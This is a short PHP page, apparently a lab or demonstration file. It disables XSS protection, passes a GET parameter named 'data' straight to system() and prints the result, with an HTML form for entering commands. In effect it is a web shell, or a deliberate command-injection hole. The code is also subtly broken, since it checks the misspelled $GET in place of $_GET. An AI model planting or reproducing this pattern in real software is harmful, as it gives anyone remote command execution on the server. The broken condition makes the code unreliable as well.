<?php

header("X-XSS-Protection:0");
if($GET)
{

	echo system($_GET["data"]);
}


?>


<form action="/" method="GET">

	Write : <input type="text" name="data"  >
			<input type="submit" value="send">



</form>
